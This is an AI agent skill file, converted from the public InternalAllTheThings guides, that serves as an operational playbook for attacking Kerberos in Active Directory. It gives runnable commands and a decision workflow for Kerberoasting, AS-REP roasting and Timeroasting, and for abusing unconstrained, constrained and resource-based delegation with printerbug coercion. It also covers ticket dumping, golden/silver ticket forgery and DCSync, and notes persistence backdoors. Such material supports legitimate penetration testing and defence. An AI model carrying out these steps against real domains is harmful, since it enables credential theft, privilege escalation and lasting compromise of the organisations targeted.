---
name: active-directory-kerberos
description: >-
  Attack Kerberos in Active Directory: Kerberoasting, AS-REP roasting, Timeroasting, ticket
  forging (golden, silver, bronze bit), S4U2Self/S4U2Proxy, and unconstrained, constrained and
  resource-based constrained delegation abuse. Use when you have domain credentials and want
  service-account or privileged-account hashes, when a host or account is trusted for delegation,
  when you need to forge, convert or renew tickets, or when explaining Kerberos delegation paths.
  Covers Rubeus, impacket, NetExec, PowerView and ticket manipulation.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "9"
  generated-by: build/build.py
---

# Active Directory Kerberos Attacks

Kerberos in AD is an offline-cracking surface first and a forgery surface second. Nearly every path
reduces to one of three questions: can I obtain an encrypted blob for an account I do not control
(roasting), do I hold a key that lets me mint tickets (krbtgt, machine account, AES keys), or does a
delegation relationship let me speak as someone else (S4U). Done means a cracked plaintext, or a
ticket in `KRB5CCNAME` that grants access to a named target.

## When to use this skill

- You hold any valid domain credential — that alone is enough to roast every SPN-bearing account.
- You hold a hash or AES key and need to escalate to a ticket (pass-the-key, overpass-the-hash,
  silver/golden ticket).
- `TrustedForDelegation`, `msds-allowedtodelegateto`, or `msDS-AllowedToActOnBehalfOfOtherIdentity`
  appeared in your enumeration output.
- You have escalated and need domain-wide impersonation or persistence.
- Kerberos fails (`KRB_AP_ERR_SKEW`, `KRB_AP_ERR_MODIFIED`) and you need the cause.

Use `active-directory-enumeration` to find the accounts and delegation flags first, and
`active-directory-credentials` for the hashes and keys this skill consumes (NTDS/DCSync, LAPS, GMSA).
Coercion primitives (PrinterBug, PetitPotam, DFS, WSP) are documented operationally in
`active-directory-lateral-movement`. Cross-domain trust tickets and SID history belong to
`active-directory-domain-escalation`.

## First moves

1. **Size the roast surface before roasting.** Stats show which accounts return RC4 and how old
   their passwords are:

   ```powershell
   Rubeus.exe kerberoast /stats
   ```

2. **Kerberoast with any domain account.** Every SPN-bearing account returns a crackable ticket:

   ```bash
   GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
   netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt
   ```

3. **AS-REP roast accounts without pre-authentication.** Select on the `4194304`
   (`DONT_REQ_PREAUTH`) UAC bit and exclude disabled accounts:

   ```bash
   bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search \
     --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' \
     --attr sAMAccountName
   GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
   ```

4. **Triage delegation in one LDAP pass** — unconstrained (flag `524288`), then constrained
   (`16777216`):

   ```bash
   nxc ldap 10.10.10.10 -u username -p password --trusted-for-delegation
   bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search \
     --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))' \
     --attr sAMAccountName,msds-allowedtodelegateto
   ```

5. **Dump and replay what is already cached** on a host you control — often faster than forging:

   ```powershell
   Rubeus.exe triage
   Rubeus.exe dump /luid:0x12d1f7
   ```

   ```bash
   KRB5CCNAME=/tmp/administrator.ccache netexec smb 10.10.10 -u user --use-kcache
   ```

6. **Exploit constrained delegation** once `msds-allowedtodelegateto` names a useful service
   (`cifs`, `host`, `ldap`, `wsman`):

   ```bash
   getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
   ```

7. **Unconstrained delegation needs an inbound authentication**, so start the listener before
   coercing, and coerce to a *hostname* — an IP yields NTLM, not a TGT:

   ```powershell
   Rubeus.exe monitor /interval:1
   ls \\dc01\pipe\spoolss          # is the spooler even reachable?
   printerbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME>
   ```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [kerberoasting.md](references/kerberoasting.md) | you have any domain account and want service-account plaintext | GetUserSPNs, NetExec `--kerberoast`, Rubeus `/stats` `/tgtdeleg` `/rc4opsec`, targetedKerberoast, roast without preauth, hashcat 13100/19600/19700 |
| [asrep-roasting.md](references/asrep-roasting.md) | an account has pre-auth disabled, or you have no account at all | `DONT_REQ_PREAUTH` query, Rubeus asreproast, GetNPUsers, hashcat 18200, roast without an account via the KRB_AS_REQ sname trick, CVE-2022-33679 |
| [timeroasting.md](references/timeroasting.md) | no credentials, but you can send NTP to a DC | `timeroast.py`, computer/trust-account hashes, hashcat 31300 |
| [tickets.md](references/tickets.md) | you hold krbtgt or a machine/service key and want access or persistence | ticket dump/replay/convert, golden/silver/diamond/sapphire forging, silver-ticket service table |
| [s4u.md](references/s4u.md) | you are SYSTEM/Network Service locally and want a domain ticket | S4U2self via Rubeus and `getST.py -self`, `tgssub` service rewrite, AppPool identity abuse |
| [delegation-constrained.md](references/delegation-constrained.md) | `msds-allowedtodelegateto` is populated | KCD discovery (PowerView/bloodyAD/BloodHound), `getST.py -spn`, Rubeus s4u with password/hash/AES, `altservice` expansion |
| [delegation-unconstrained.md](references/delegation-unconstrained.md) | a computer has `TRUSTED_FOR_DELEGATION` | flag 524288 discovery, spooler check, SpoolSample/printerbug/PetitPotam, Rubeus monitor + asktgs, DC TGT → DCSync |
| [delegation-rbcd.md](references/delegation-rbcd.md) | you can write `msds-allowedtoactonbehalfofotheridentity` on a computer | MAQ machine creation, SID/security-descriptor write, `bloodyAD add rbcd`, Rubeus hash + s4u chain |
| [bronze-bit.md](references/bronze-bit.md) | an account is protected from delegation (Protected Users / sensitive) | CVE-2020-17049, `getST.py -force-forwardable`, patch detection via `KRB_AP_ERR_MODIFIED` |

## Workflow

1. **Check the clock before anything else.** Kerberos tolerates 5 minutes of skew; confirm with
   `nmap --script smb2-time` on port 445 (also recorded in `active-directory-enumeration`,
   `tricks.md`).
2. **No credentials at all.** Timeroasting (NTP, unauthenticated) → AS-REP roasting against a
   username list → kerberoasting without pre-authentication using `GetUserSPNs.py -no-preauth`
   or `Rubeus.exe kerberoast /nopreauth:`.
3. **One valid account.** Roast SPNs with `GetUserSPNs.py -request`. If the SPN list is thin, look
   for a write edge on `servicePrincipalName`: targeted Kerberoasting sets the SPN, roasts, then
   removes it (see `active-directory-enumeration`, `acl-ace.md`). Crack in the mode matching the
   etype you received.
4. **A hash or AES key.** Overpass-the-hash / pass-the-key converts it into a TGT, after which you
   are that principal over LDAP and SMB. A machine or service key also enables step 5 or 6.
5. **Delegation branch — decide by attribute, never by guesswork:**
   - `TRUSTED_FOR_DELEGATION` (524288) on a host you control → unconstrained: coerce a DC computer
     account to authenticate, capture the TGT, then DCSync with it.
   - `msds-allowedtodelegateto` non-empty → constrained: `getST.py -spn <listed spn> -impersonate`.
     Use `altservice`/`Rubeus tgssub` to reach other services on that host, since the service name
     is not inside the encrypted TGS.
   - Writable `msds-allowedtoactonbehalfofotheridentity` (or MAQ > 0) → RBCD: create a machine
     account, write the descriptor, then S4U2proxy as Administrator.
   - Protected Users / "sensitive and cannot be delegated" → only Bronze Bit (`-force-forwardable`)
     applies, and only against unpatched DCs.
6. **Forgery branch.** krbtgt NT hash → golden (survives password resets until krbtgt is rotated
   twice). Machine hash → silver for one host, no DC contact. krbtgt AES key → diamond/sapphire
   (real TGT, rewritten PAC).
7. **Use the ticket.** Convert kirbi↔ccache with `impacket-ticketConverter`, `export KRB5CCNAME`,
   authenticate with `-k -no-pass`.

## Gotchas

- Match cracker to ticket: `13100` = TGS etype 23 (RC4), `19600` = etype 17 (AES128), `19700` =
  etype 18 (AES256), `18200` = AS-REP, `31300` = timeroast. A wrong mode looks like an uncrackable
  hash, not an error.
- After the CVE-2021-42287 mitigations a golden ticket cannot name a non-existent account — use a
  real principal or it will not validate. Mimikatz golden tickets default to a 10-year lifetime,
  which policy-based detection catches immediately.
- Unconstrained delegation captures a TGT only when the coerced authentication is Kerberos: coerce
  to a **hostname**, not an IP. Confirm the spooler answers on `\\host\pipe\spoolss`; if the Print
  Spooler is disabled, switch to PetitPotam (MS-EFSRPC).
- Unconstrained delegation silently does nothing for Protected Users and accounts flagged
  "sensitive and cannot be delegated" — no TGT is ever stored, so there is no error to chase.
- Bronze Bit is patched (November 2020 update, enforcement phased through February 2021). Failure
  signature is `KRB_AP_ERR_MODIFIED`, which also appears for unrelated reasons.
- S4U2self abuse needs only local SYSTEM/Network Service. `Rubeus.exe s4u` prints the S4U2self
  ticket even though it reports failure at the S4UProxy step — read the output, not the exit code.
- RBCD requires Windows Server 2012+ on the target, and creating the attacker computer consumes
  machine account quota. `bloodyAD add rbcd` has a matching `remove` — a leftover descriptor is a
  persistent backdoor.
- A silver ticket is validated by the service without DC contact, so a stale machine password fails
  as an ordinary access-denied with no DC-side event to correlate.

## Authorized use

For authorized engagements only, with explicit permission and within the agreed scope. Ticket
forgery and RBCD writes alter domain state — record what you create and revert it.

## Source

Converted from the upstream InternalAllTheThings guides
(https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
